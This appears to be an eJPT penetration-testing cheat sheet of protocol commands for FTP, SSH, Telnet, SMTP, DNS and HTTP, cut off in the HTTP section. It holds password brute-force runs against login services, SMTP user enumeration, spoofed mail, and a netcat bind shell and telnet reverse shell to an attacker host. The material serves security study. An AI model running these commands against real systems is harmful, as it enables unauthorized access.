# 🎯 eJPT Protocols - Complete Commands Cheat Sheet

## 📋 FTP (Port 21)

### 🔍 Discovery & Enumeration
```bash
# Nmap comprehensive FTP scanning
nmap -p 21 -sV -sC <target_ip>
nmap -p 21 --script=ftp-* <target_ip>
nmap -p 21 --script ftp-anon <target_ip>
nmap -p 21 --script ftp-bounce <target_ip>
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>
nmap -p 21 --script ftp-libopie <target_ip>
nmap -p 21 --script ftp-proftpd-backdoor <target_ip>
nmap -p 21 --script ftp-vsftpd-backdoor <target_ip>
nmap -p 21 --script ftp-vuln-cve2010-4221 <target_ip>

# Banner grabbing (multiple methods)
nc -nv <target_ip> 21
telnet <target_ip> 21
echo "QUIT" | nc -nv <target_ip> 21

# FTP client connection
ftp <target_ip>
ftp -n <target_ip>  # No auto-login
ftp -v <target_ip>  # Verbose mode
ftp -d <target_ip>  # Debug mode

# Anonymous login attempts
ftp <target_ip>
# Username: anonymous
# Password: anonymous

ftp <target_ip>
# Username: ftp
# Password: ftp

# Check FTP version
nc -nv <target_ip> 21
```

### 🔓 Authentication & Brute Force
```bash
# Hydra FTP brute force (various methods)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>
hydra -L users.txt -P passwords.txt ftp://<target_ip>
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target_ip> -t 4
hydra -l admin -P passwords.txt -e nsr ftp://<target_ip>  # n=null, s=same as login, r=reverse
hydra -C /usr/share/wordlists/default-credentials.txt ftp://<target_ip>  # Colon-separated user:pass
hydra -l admin -P passwords.txt ftp://<target_ip> -V  # Verbose
hydra -l admin -P passwords.txt ftp://<target_ip> -f  # Stop after first success

# Medusa FTP brute force
medusa -h <target_ip> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
medusa -h <target_ip> -U users.txt -P passwords.txt -M ftp -t 4
medusa -h <target_ip> -u admin -P passwords.txt -M ftp -f

# Ncrack FTP brute force
ncrack -p 21 --user admin -P /usr/share/wordlists/rockyou.txt <target_ip>
ncrack -p 21 -U users.txt -P passwords.txt <target_ip>

# Metasploit FTP modules
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target_ip>
run

use auxiliary/scanner/ftp/anonymous
set RHOSTS <target_ip>
run

use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target_ip>
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

use auxiliary/scanner/ftp/bison_ftp_traversal
set RHOSTS <target_ip>
run
```

### 📁 File Operations & Commands
```bash
# Connect and login
ftp <target_ip>
open <target_ip>
user username password

# Directory navigation
ls                      # List files in current directory
ls -la                  # List files with details
ls -R                   # Recursive listing
dir                     # Alternative to ls
pwd                     # Print working directory
cd directory_name       # Change directory
cd ..                   # Go up one level
cd /                    # Go to root
cdup                    # Change to parent directory

# File download
get filename                              # Download single file
get filename local_filename              # Download with different name
mget *.txt                               # Download multiple files (wildcard)
mget file1 file2 file3                   # Download multiple specific files
recv filename                            # Alternative to get
prompt off                               # Disable prompting for multiple files
mget *                                   # Download all files (no prompts)

# File upload
put filename                             # Upload single file
put local_file remote_file              # Upload with different name
mput *.php                              # Upload multiple files
mput file1 file2 file3                  # Upload multiple specific files
send filename                           # Alternative to put

# Transfer modes
binary                  # Binary mode (for executables, images, archives)
ascii                   # ASCII mode (for text files)
type i                  # Set binary mode
type a                  # Set ASCII mode

# File management
delete filename         # Delete file
mdelete *.txt          # Delete multiple files
rmdir directory        # Remove directory
mkdir directory        # Create directory
rename old_name new_name  # Rename file

# Information commands
status                  # Show current status
system                  # Show system type
help                    # Show available commands
help command           # Show help for specific command
passive                # Toggle passive mode
quote SYST             # Get system information
quote HELP             # Server help

# Advanced commands
quote SITE CHMOD 777 file.php    # Change file permissions
site chmod 777 file.php          # Alternative chmod
quote PASV                       # Enter passive mode
quote STAT                       # Status information

# Exit FTP
bye                     # Exit FTP session
quit                    # Alternative to bye
exit                    # Another way to exit
```

### 🔧 Advanced FTP Techniques
```bash
# Download entire directory
wget -r ftp://username:password@<target_ip>/directory/
wget -m ftp://username:password@<target_ip>/  # Mirror entire FTP

# FTP via cURL
curl ftp://<target_ip>/ --user username:password
curl ftp://<target_ip>/file.txt --user username:password -o downloaded_file.txt
curl -T upload_file.txt ftp://<target_ip>/ --user username:password

# FTP Bounce Attack
nmap -Pn -v -p 21,22,80 -b username:password@<ftp_server> <target_ip>

# Check for FTP vulnerabilities
nmap -p 21 --script ftp-vuln* <target_ip>

# FTP through proxy
ftp -p <target_ip>  # Passive mode (useful behind firewalls)

# Automated FTP interaction
ftp -inv <target_ip> <<EOF
user username password
binary
cd /directory
get file.txt
bye
EOF
```

---

## 📋 SSH (Port 22)

### 🔍 Discovery & Enumeration
```bash
# Nmap SSH scanning
nmap -p 22 -sV -sC <target_ip>
nmap -p 22 --script=ssh-* <target_ip>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" <target_ip>
nmap -p 22 --script ssh-hostkey <target_ip>
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>
nmap -p 22 --script ssh2-enum-algos <target_ip>
nmap -p 22 --script ssh-publickey-acceptance <target_ip>
nmap -p 22 --script sshv1 <target_ip>

# Banner grabbing
nc -nv <target_ip> 22
telnet <target_ip> 22
echo "exit" | nc <target_ip> 22

# SSH version detection
ssh -v <target_ip>
ssh -vv <target_ip>  # More verbose
ssh -vvv <target_ip>  # Maximum verbosity

# Check supported authentication methods
ssh -o PreferredAuthentications=none <target_ip>
ssh -o PreferredAuthentications=password <target_ip>
ssh -o PreferredAuthentications=publickey <target_ip>
```

### 🔓 Authentication & Access
```bash
# Standard SSH login
ssh user@<target_ip>
ssh user@<target_ip> -p 2222
ssh -l user <target_ip>
ssh user@<target_ip> -o Port=2222

# SSH with password (non-interactive)
sshpass -p 'password' ssh user@<target_ip>
sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@<target_ip>

# SSH with private key
ssh -i private_key user@<target_ip>
ssh -i id_rsa user@<target_ip>
ssh -i /path/to/key -o IdentitiesOnly=yes user@<target_ip>
chmod 600 private_key  # Fix key permissions first

# SSH with different key algorithms
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa user@<target_ip>
ssh -o HostKeyAlgorithms=+ssh-rsa user@<target_ip>

# SSH with specific cipher
ssh -c aes256-cbc user@<target_ip>
ssh -c 3des-cbc user@<target_ip>

# Disable strict host key checking
ssh -o StrictHostKeyChecking=no user@<target_ip>
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@<target_ip>

# SSH with X11 forwarding
ssh -X user@<target_ip>
ssh -Y user@<target_ip>  # Trusted X11 forwarding

# SSH agent forwarding
ssh -A user@<target_ip>

# SSH with specific configuration
ssh -F custom_ssh_config user@<target_ip>
ssh -o "User=admin" -o "Port=2222" <target_ip>
```

### 🔓 Brute Force Attacks
```bash
# Hydra SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
hydra -L users.txt -P passwords.txt ssh://<target_ip>
hydra -l admin -P passwords.txt ssh://<target_ip> -t 4
hydra -l admin -P passwords.txt -e nsr ssh://<target_ip>
hydra -C /usr/share/wordlists/default-credentials.txt ssh://<target_ip>
hydra -l admin -P passwords.txt ssh://<target_ip> -V -f
hydra -l admin -P passwords.txt ssh://<target_ip> -s 2222  # Custom port

# Medusa SSH brute force
medusa -h <target_ip> -u root -P /usr/share/wordlists/rockyou.txt -M ssh
medusa -h <target_ip> -U users.txt -P passwords.txt -M ssh -t 4
medusa -h <target_ip> -u admin -P passwords.txt -M ssh -f

# Ncrack SSH brute force
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt <target_ip>
ncrack -p 22 -U users.txt -P passwords.txt <target_ip>
ncrack ssh://<target_ip> -u admin -P passwords.txt

# Patator SSH brute force
patator ssh_login host=<target_ip> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed'

# Metasploit SSH modules
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target_ip>
run

use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target_ip>
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set THREADS 4
run

use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <target_ip>
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run

use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS <target_ip>
set USERNAME root
set KEY_PATH /root/.ssh/id_rsa
run
```

### 🛠️ Remote Command Execution
```bash
# Execute single command
ssh user@<target_ip> "whoami"
ssh user@<target_ip> "uname -a"
ssh user@<target_ip> "cat /etc/passwd"
ssh user@<target_ip> "ls -la /home"
ssh user@<target_ip> "id"

# Execute multiple commands
ssh user@<target_ip> "whoami; id; hostname"
ssh user@<target_ip> "command1 && command2 && command3"
ssh user@<target_ip> 'bash -c "command1; command2"'

# Execute commands with sudo
ssh user@<target_ip> "echo password | sudo -S command"
ssh -t user@<target_ip> "sudo command"  # -t for pseudo-terminal

# Execute script remotely
ssh user@<target_ip> 'bash -s' < local_script.sh
cat script.sh | ssh user@<target_ip> 'bash'
ssh user@<target_ip> < commands.txt
```

### 📁 File Transfer (SCP & SFTP)
```bash
# SCP - Upload to remote
scp file.txt user@<target_ip>:/path/to/destination/
scp -P 2222 file.txt user@<target_ip>:/path/
scp -i private_key file.txt user@<target_ip>:/path/
scp -r directory/ user@<target_ip>:/path/  # Recursive directory upload
scp file1 file2 file3 user@<target_ip>:/path/  # Multiple files

# SCP - Download from remote
scp user@<target_ip>:/path/to/file.txt .
scp -P 2222 user@<target_ip>:/path/file.txt /local/path/
scp -r user@<target_ip>:/remote/directory/ /local/path/
scp user@<target_ip>:/path/file* .  # Download with wildcard

# SCP through jump host
scp -o "ProxyJump=jumphost" file.txt user@<target_ip>:/path/

# SCP with compression
scp -C file.txt user@<target_ip>:/path/

# SCP with bandwidth limit
scp -l 1024 file.txt user@<target_ip>:/path/  # Limit to 1024 Kbit/s

# SFTP interactive session
sftp user@<target_ip>
sftp -P 2222 user@<target_ip>
sftp -i private_key user@<target_ip>

# SFTP commands (inside session)
ls                      # List remote files
lls                     # List local files
pwd                     # Remote working directory
lpwd                    # Local working directory
cd directory           # Change remote directory
lcd directory          # Change local directory
get filename           # Download file
get -r directory       # Download directory recursively
put filename           # Upload file
put -r directory       # Upload directory recursively
mkdir directory        # Create remote directory
rmdir directory        # Remove remote directory
rm filename            # Delete remote file
rename old new         # Rename remote file
chmod 755 file         # Change file permissions
exit                   # Exit SFTP

# SFTP non-interactive
sftp user@<target_ip>:/remote/file.txt /local/path/
echo "get /remote/file.txt" | sftp user@<target_ip>
sftp user@<target_ip> <<EOF
get file.txt
bye
EOF
```

### 🔧 SSH Tunneling & Port Forwarding
```bash
# Local Port Forwarding (access remote service via local port)
ssh -L 8080:localhost:80 user@<target_ip>
ssh -L 3306:localhost:3306 user@<target_ip>  # MySQL forwarding
ssh -L 1234:internal_host:80 user@<target_ip>  # Forward to internal host
ssh -L 8080:localhost:80 -L 8443:localhost:443 user@<target_ip>  # Multiple forwards

# Remote Port Forwarding (expose local service to remote)
ssh -R 8080:localhost:80 user@<target_ip>
ssh -R 3389:internal_host:3389 user@<target_ip>
ssh -R 0.0.0.0:8080:localhost:80 user@<target_ip>  # Bind to all interfaces

# Dynamic Port Forwarding (SOCKS proxy)
ssh -D 1080 user@<target_ip>
ssh -D 0.0.0.0:1080 user@<target_ip>
ssh -D 9050 -N user@<target_ip>  # -N for no command execution

# Use SOCKS proxy with tools
proxychains nmap -sT -Pn <target_ip>
proxychains curl http://internal_host

# Edit /etc/proxychains.conf
# Add: socks5 127.0.0.1 1080

# ProxyChains with Firefox
proxychains firefox

# SSH Jump Host (ProxyJump)
ssh -J jumphost user@<target_ip>
ssh -J user1@jumphost1,user2@jumphost2 user@<target_ip>

# SSH through multiple hops
ssh -o ProxyCommand="ssh -W %h:%p user@jumphost" user@<target_ip>

# Persistent tunnel
ssh -f -N -L 8080:localhost:80 user@<target_ip>  # -f background, -N no command

# Keep connection alive
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 user@<target_ip>
```

### 🔑 SSH Key Management
```bash
# Generate SSH key pair
ssh-keygen
ssh-keygen -t rsa -b 4096
ssh-keygen -t ed25519
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
ssh-keygen -f custom_key_name -t rsa -b 2048

# Copy public key to remote server
ssh-copy-id user@<target_ip>
ssh-copy-id -i ~/.ssh/id_rsa.pub user@<target_ip>
ssh-copy-id -i custom_key.pub -p 2222 user@<target_ip>

# Manually add key to authorized_keys
cat ~/.ssh/id_rsa.pub | ssh user@<target_ip> "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Convert key formats
ssh-keygen -p -f keyfile -m pem  # Convert to PEM format
ssh-keygen -e -f keyfile  # Export public key
ssh-keygen -y -f private_key > public_key  # Generate public from private

# Extract public key from private key
ssh-keygen -y -f ~/.ssh/id_rsa

# Change key passphrase
ssh-keygen -p -f ~/.ssh/id_rsa

# Test key authentication
ssh -vv -i private_key user@<target_ip>
```

### 🔧 Advanced SSH Techniques
```bash
# SSH with timeout
ssh -o ConnectTimeout=10 user@<target_ip>

# SSH escape sequences (press Enter~?)
~.                      # Disconnect
~^Z                     # Background SSH
~#                      # List forwarded connections
~?                      # Help

# SSH config file (~/.ssh/config)
cat << EOF > ~/.ssh/config
Host target
    HostName <target_ip>
    User username
    Port 2222
    IdentityFile ~/.ssh/custom_key
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
EOF

# Then connect with
ssh target

# SSH Multiplexing (reuse connection)
ssh -M -S /tmp/ssh_socket user@<target_ip>  # Master connection
ssh -S /tmp/ssh_socket user@<target_ip>     # Reuse connection

# Check SSH connection without login
ssh -T user@<target_ip>

# SSH with specific MAC algorithm
ssh -m hmac-sha2-256 user@<target_ip>

# Force protocol version
ssh -2 user@<target_ip>  # SSH protocol 2 only

# Disable password authentication
ssh -o PasswordAuthentication=no user@<target_ip>

# Disable public key authentication
ssh -o PubkeyAuthentication=no user@<target_ip>
```

---

## 📋 Telnet (Port 23)

### 🔍 Discovery & Enumeration
```bash
# Nmap Telnet scanning
nmap -p 23 -sV -sC <target_ip>
nmap -p 23 --script telnet-* <target_ip>
nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>
nmap -p 23 --script telnet-encryption <target_ip>
nmap -p 23 --script telnet-ntlm-info <target_ip>

# Connect to Telnet
telnet <target_ip>
telnet <target_ip> 23
telnet <target_ip> 2323  # Alternative port

# Banner grabbing
nc -nv <target_ip> 23
echo "" | nc -nv <target_ip> 23
timeout 5 telnet <target_ip>

# Check if Telnet is open
nmap -p 23 --open <target_ip>
nc -zv <target_ip> 23
```

### 🔓 Authentication & Brute Force
```bash
# Manual Telnet login
telnet <target_ip>
# Enter username when prompted
# Enter password when prompted

# Telnet with timeout
timeout 30 telnet <target_ip>

# Hydra Telnet brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://<target_ip>
hydra -L users.txt -P passwords.txt telnet://<target_ip>
hydra -l root -P passwords.txt telnet://<target_ip> -t 4
hydra -l admin -P passwords.txt -e nsr telnet://<target_ip>
hydra -C /usr/share/wordlists/default-credentials.txt telnet://<target_ip>
hydra -l admin -P passwords.txt telnet://<target_ip> -V -f

# Medusa Telnet brute force
medusa -h <target_ip> -u admin -P /usr/share/wordlists/rockyou.txt -M telnet
medusa -h <target_ip> -U users.txt -P passwords.txt -M telnet -t 4

# Ncrack Telnet brute force
ncrack -p 23 --user admin -P /usr/share/wordlists/rockyou.txt <target_ip>
ncrack telnet://<target_ip> -u root -P passwords.txt

# Patator Telnet brute force
patator telnet_login host=<target_ip> inputs='FILE0\nFILE1' 0=users.txt 1=passwords.txt persistent=0 -x ignore:fgrep='Login incorrect'

# Metasploit Telnet modules
msfconsole
use auxiliary/scanner/telnet/telnet_version
set RHOSTS <target_ip>
run

use auxiliary/scanner/telnet/telnet_login
set RHOSTS <target_ip>
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

use auxiliary/scanner/telnet/telnet_encrypt_overflow
set RHOSTS <target_ip>
run
```

### 🛠️ Telnet Commands & Usage
```bash
# Telnet to specific services
telnet <target_ip> 80       # HTTP
telnet <target_ip> 25       # SMTP
telnet <target_ip> 110      # POP3
telnet <target_ip> 21       # FTP
telnet <target_ip> 3306     # MySQL

# HTTP via Telnet
telnet <target_ip> 80
GET / HTTP/1.1
Host: target.com
[Enter twice]

# SMTP via Telnet
telnet <target_ip> 25
HELO test.com
MAIL FROM:<sender@test.com>
RCPT TO:<recipient@target.com>
DATA
Subject: Test
Test message
.
QUIT

# POP3 via Telnet
telnet <target_ip> 110
USER username
PASS password
LIST
RETR 1
QUIT

# Escape sequences in Telnet
Ctrl+]                  # Telnet prompt
quit                    # Exit telnet
close                   # Close connection
status                  # Show status
display                 # Display operating parameters
mode                    # Try to enter line or character mode
open <host> [port]      # Connect to a site
set echo                # Toggle local echo

# Non-interactive Telnet commands
(echo open <target_ip> 23; sleep 2; echo username; sleep 2; echo password; sleep 2; echo commands) | telnet

# Automated Telnet interaction
{ echo username; sleep 1; echo password; sleep 1; echo "ls -la"; sleep 1; echo exit; } | telnet <target_ip>

# Expect script for Telnet automation
expect << EOF
spawn telnet <target_ip>
expect "login:"
send "username\r"
expect "Password:"
send "password\r"
expect "$"
send "whoami\r"
send "exit\r"
EOF
```

### 🔧 Advanced Telnet Techniques
```bash
# Check Telnet cipher support
nmap --script telnet-encryption <target_ip>

# Telnet through netcat
nc <target_ip> 23

# Create Telnet backdoor (for authorized testing)
nc -lvp 4444 -e /bin/bash  # On target
telnet <target_ip> 4444     # From attacker

# Telnet logging
telnet <target_ip> | tee telnet_session.log

# Reverse Telnet connection
mkfifo /tmp/pipe
telnet <attacker_ip> <port> 0</tmp/pipe | /bin/bash 1>/tmp/pipe

# Find Telnet on non-standard ports
nmap -p- --open | grep telnet
nmap -p 1-65535 -sV | grep -i telnet
```

---

## 📋 SMTP (Port 25, 465, 587)

### 🔍 Discovery & Enumeration
```bash
# Nmap SMTP scanning
nmap -p 25 -sV -sC <target_ip>
nmap -p 25,465,587 -sV -sC <target_ip>
nmap -p 25 --script smtp-* <target_ip>
nmap -p 25 --script smtp-commands <target_ip>
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <target_ip>
nmap -p 25 --script smtp-open-relay <target_ip>
nmap -p 25 --script smtp-vuln-cve2010-4344 <target_ip>
nmap -p 25 --script smtp-vuln-cve2011-1720 <target_ip>
nmap -p 25 --script smtp-brute --script-args userdb=users.txt,passdb=passwords.txt <target_ip>
nmap -p 25 --script smtp-ntlm-info <target_ip>

# Banner grabbing
nc -nv <target_ip> 25
telnet <target_ip> 25
echo "QUIT" | nc -nv <target_ip> 25

# Check SMTP version
nmap -sV -p 25 <target_ip>
```

### 📧 SMTP Manual Commands
```bash
# Connect to SMTP
telnet <target_ip> 25
nc -nv <target_ip> 25

# Basic SMTP commands
HELO domain.com          # Identify yourself
EHLO domain.com          # Extended HELLO
MAIL FROM:<sender@domain.com>
RCPT TO:<recipient@domain.com>
DATA                     # Start message body
.                        # End message (single dot)
QUIT                     # Close connection
RSET                     # Reset connection
NOOP                     # No operation (keepalive)
HELP                     # Show available commands

# User enumeration commands
VRFY root                # Verify if user exists
VRFY admin
VRFY test
EXPN mailinglist        # Expand mailing list
RCPT TO:<user@domain>   # Another enumeration method

# Complete SMTP session example
telnet <target_ip> 25
EHLO attacker.com
MAIL FROM:<attacker@test.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test Email
From: attacker@test.com
To: victim@target.com

This is the message body.
.
QUIT

# SMTP over SSL/TLS
openssl s_client -connect <target_ip>:465 -crlf -quiet
openssl s_client -starttls smtp -connect <target_ip>:587 -crlf -quiet

# SMTP AUTH
telnet <target_ip> 25
EHLO test.com
AUTH LOGIN
[Base64 encoded username]
[Base64 encoded password]

# Encode credentials for AUTH LOGIN
echo -n "username" | base64
echo -n "password" | base64
```

### 👤 User Enumeration
```bash
# smtp-user-enum tool
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <target_ip>
smtp-user-enum -M EXPN -U users.txt -t <target_ip>
smtp-user-enum -M RCPT -U users.txt -t <target_ip>
smtp-user-enum -M VRFY -u root -t <target_ip>
smtp-user-enum -M VRFY -U users.txt -t <target_ip> -p 25
smtp-user-enum -M VRFY -U users.txt -D domain.com -t <target_ip>

# Manual VRFY enumeration
for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 <target_ip> 25 2>/dev/null | grep "^250"; done

# Manual RCPT enumeration
for user in $(cat users.txt); do
  echo -e "HELO test\nMAIL FROM:<test@test.com>\nRCPT TO:<$user@target.com>" | nc -nv <target_ip> 25 | grep "250"
done

# Metasploit user enumeration
msfconsole
use auxiliary/scanner/smtp/smtp_version
set RHOSTS <target_ip>
run

use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target_ip>
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set UNIXONLY true
run

use auxiliary/scanner/smtp/smtp_relay
set RHOSTS <target_ip>
run

# Nmap user enumeration
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT},userdb=/usr/share/wordlists/metasploit/unix_users.txt <target_ip>
```

### 🔓 Authentication & Brute Force
```bash
# Hydra SMTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://<target_ip>
hydra -L users.txt -P passwords.txt smtp://<target_ip>
hydra -l admin@domain.com -P passwords.txt smtp://<target_ip> -t 4
hydra -l admin -P passwords.txt smtp://<target_ip> -s 587
hydra -l admin -P passwords.txt smtp://<target_ip> -V -f
hydra -C /usr/share/wordlists/default-credentials.txt smtp://<target_ip>

# Medusa SMTP brute force
medusa -h <target_ip> -u admin -P /usr/share/wordlists/rockyou.txt -M smtp
medusa -h <target_ip> -U users.txt -P passwords.txt -M smtp -t 4

# Metasploit SMTP login
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target_ip>
set USER_FILE users.txt
run
```

### 📬 Sending Emails via SMTP
```bash
# Send email with swaks
swaks --to victim@target.com --from attacker@test.com --server <target_ip>
swaks --to victim@target.com --from attacker@test.com --header "Subject: Test" --body "Test message" --server <target_ip>
swaks --to victim@target.com --from attacker@test.com --attach /path/to/file.pdf --server <target_ip>
swaks --to victim@target.com --from attacker@test.com --server <target_ip> --auth-user admin --auth-password password

# Send email with sendemail
sendemail -f attacker@test.com -t victim@target.com -u "Subject" -m "Message body" -s <target_ip>
sendemail -f attacker@test.com -t victim@target.com -u "Subject" -m "Message" -s <target_ip> -xu admin -xp password

# Send email with Python
python3 << EOF
import smtplib
server = smtplib.SMTP('<target_ip>', 25)
server.sendmail('from@test.com', 'to@target.com', 'Subject: Test\n\nMessage body')
server.quit()
EOF

# Send email via telnet/netcat
nc <target_ip> 25 << EOF
HELO test.com
MAIL FROM:<attacker@test.com>
RCPT TO:<victim@target.com>
DATA
Subject: Important
From: attacker@test.com
To: victim@target.com

This is the email body.
.
QUIT
EOF
```

### 🔧 Advanced SMTP Techniques
```bash
# Check for open relay
nmap -p 25 --script smtp-open-relay <target_ip>

# Manual open relay test
telnet <target_ip> 25
HELO test.com
MAIL FROM:<test@external.com>
RCPT TO:<victim@anotherdomain.com>
DATA
Test message
.
QUIT

# SMTP command injection test
MAIL FROM:<test@test.com>\r\nRCPT TO:<admin@target.com>

# Extract SMTP banner information
telnet <target_ip> 25
EHLO test

# SMTP NTLM information disclosure
nmap -p 25 --script smtp-ntlm-info <target_ip>

# Test SMTP vulnerabilities
nmap -p 25 --script smtp-vuln* <target_ip>
```

---

## 📋 DNS (Port 53)

### 🔍 Discovery & Enumeration
```bash
# Nmap DNS scanning
nmap -p 53 -sU -sV <target_ip>
nmap -p 53 -sV -sC <target_ip>
nmap -p 53 --script dns-* <target_ip>
nmap -p 53 --script dns-brute <target_ip>
nmap -p 53 --script dns-zone-transfer <target_ip>
nmap -p 53 --script dns-recursion <target_ip>
nmap -p 53 --script dns-cache-snoop <target_ip>
nmap -p 53 --script dns-nsid <target_ip>

# Check if DNS server is running
nc -nvu <target_ip> 53
dig @<target_ip> version.bind chaos txt
```

### 🔍 DNS Query Commands
```bash
# dig - DNS lookup
dig @<target_ip> domain.com
dig @<target_ip> domain.com A
dig @<target_ip> domain.com AAAA
dig @<target_ip> domain.com MX
dig @<target_ip> domain.com NS
dig @<target_ip> domain.com TXT
dig @<target_ip> domain.com SOA
dig @<target_ip> domain.com ANY
dig @<target_ip> domain.com CNAME
dig @<target_ip> domain.com PTR
dig @<target_ip> -x 192.168.1.1  # Reverse lookup

# dig advanced options
dig @<target_ip> domain.com +short
dig @<target_ip> domain.com +noall +answer
dig @<target_ip> domain.com +trace
dig @<target_ip> domain.com +dnssec
dig @<target_ip> domain.com +tcp  # Force TCP
dig @<target_ip> domain.com -p 5353  # Custom port

# nslookup - DNS queries
nslookup domain.com <target_ip>
nslookup -type=A domain.com <target_ip>
nslookup -type=MX domain.com <target_ip>
nslookup -type=NS domain.com <target_ip>
nslookup -type=TXT domain.com <target_ip>
nslookup -type=ANY domain.com <target_ip>
nslookup -type=SOA domain.com <target_ip>

# nslookup interactive mode
nslookup
server <target_ip>
set type=any
domain.com
set type=mx
domain.com
exit

# host - DNS lookup
host domain.com <target_ip>
host -t A domain.com <target_ip>
host -t MX domain.com <target_ip>
host -t NS domain.com <target_ip>
host -t TXT domain.com <target_ip>
host -t SOA domain.com <target_ip>
host -t ANY domain.com <target_ip>
host -a domain.com <target_ip>  # All records
host -l domain.com <target_ip>  # Zone transfer attempt
```

### 🔓 DNS Zone Transfer
```bash
# Zone transfer with dig
dig axfr @<target_ip> domain.com
dig axfr @<target_ip> @ns1.domain.com domain.com
dig axfr domain.com @<target_ip>

# Zone transfer with host
host -l domain.com <target_ip>
host -l -a domain.com <target_ip>

# Zone transfer with nslookup
nslookup
server <target_ip>
ls domain.com
ls -d domain.com

# Automated zone transfer check
for ns in $(host -t ns domain.com | awk '{print $4}'); do
  host -l domain.com $ns
done

# Metasploit DNS enumeration
msfconsole
use auxiliary/gather/dns_info
set DOMAIN domain.com
set NS <target_ip>
run

use auxiliary/gather/dns_reverse_lookup
set RANGE 192.168.1.0/24
set NS <target_ip>
run

use auxiliary/gather/dns_srv_enum
set DOMAIN domain.com
set NS <target_ip>
run
```

### 🔍 DNS Enumeration Tools
```bash
# DNSRecon
dnsrecon -d domain.com -t axfr
dnsrecon -d domain.com -t brt -D /usr/share/wordlists/dnsmap.txt
dnsrecon -d domain.com -t std
dnsrecon -d domain.com -t rvl -r 192.168.1.0/24
dnsrecon -d domain.com -n <target_ip>
dnsrecon -d domain.com -t zonewalk
dnsrecon -d domain.com -a  # All enumeration

# DNSenum
dnsenum domain.com
dnsenum --dnsserver <target_ip> domain.com
dnsenum --enum domain.com
dnsenum -f /usr/share/wordlists/dnsmap.txt domain.com
dnsenum --threads 10 -f dns-wordlist.txt domain.com

# Fierce
fierce --domain domain.com
fierce --dns-servers <target_ip> --domain domain.com
fierce --domain domain.com --subdomain-file subdomains.txt
fierce --domain domain.com --range 192.168.1.0/24

# DNSMap
dnsmap domain.com
dnsmap domain.com -w wordlist.txt
dnsmap domain.com -r results.txt

# Sublist3r
sublist3r -d domain.com
sublist3r -d domain.com -e google,bing,yahoo

# Amass
amass enum -d domain.com
amass enum -d domain.com -src
amass enum -passive -d domain.com

# Subfinder
subfinder -d domain.com
subfinder -d domain.com -silent
```

### 🔧 Advanced DNS Techniques
```bash
# DNS brute forcing subdomains
for sub in $(cat subdomains.txt); do
  host $sub.domain.com <target_ip> | grep "has address"
done

# DNS cache snooping
dig @<target_ip> domain.com +norecurse

# Check DNS recursion
dig @<target_ip> google.com
nmap -sU -p 53 --script dns-recursion <target_ip>

# DNS amplification test
dig @<target_ip> ANY google.com

# Reverse DNS lookup range
for ip in {1..254}; do
  host 192.168.1.$ip <target_ip> | grep "domain name pointer"
done

# DNS tunneling detection
nmap -sU -p 53 --script dns-service-discovery <target_ip>

# Extract DNS server version
dig @<target_ip> version.bind chaos txt
dig @<target_ip> version.server chaos txt
nmap -sU -p 53 --script dns-nsid <target_ip>
```

---

## 📋 HTTP/HTTPS (Port 80, 443, 8080, 8443)

### 🔍 Discovery & Basic Enumeration
```bash
# Nmap HTTP scanning
nmap -p 80 -sV -sC <target_ip>
nmap -p 80,443,8080,8443 -sV -sC <target_ip>
nmap -p 80 --script http-* <target_ip>
nmap -p 80 --script http-enum <target_ip>
nmap -p 80 --script http-headers <target_ip>
nmap -p 80 --script http-methods <target_ip>
nmap -p 80 --script http-title <target_ip>
nmap -p 80 --script http-robots.txt <target_ip>
nmap -p 80 --script http-vuln* <target_ip>
nmap -p 80 --script http-shellshock <target_ip>
nmap -p 80 --script http-wordpress-enum <target_ip>

# Banner grabbing
nc -nv <target_ip> 80
GET / HTTP/1.1
Host: <target_ip>

[Press Enter twice]

telnet <target_ip> 80
HEAD / HTTP/1.1
Host: <target_ip>

[Press Enter twice]

# cURL commands
curl http://<target_ip>
curl -I http://<target_ip>  # Headers only
curl -i http://<target_ip>  # Include headers
curl -v http://<target_ip>  # Verbose
curl -X OPTIONS http://<target_ip>  # HTTP methods
curl -A "User-Agent" http://<target_ip>  # Custom user agent
curl -L http://<target_ip>  # Follow redirects
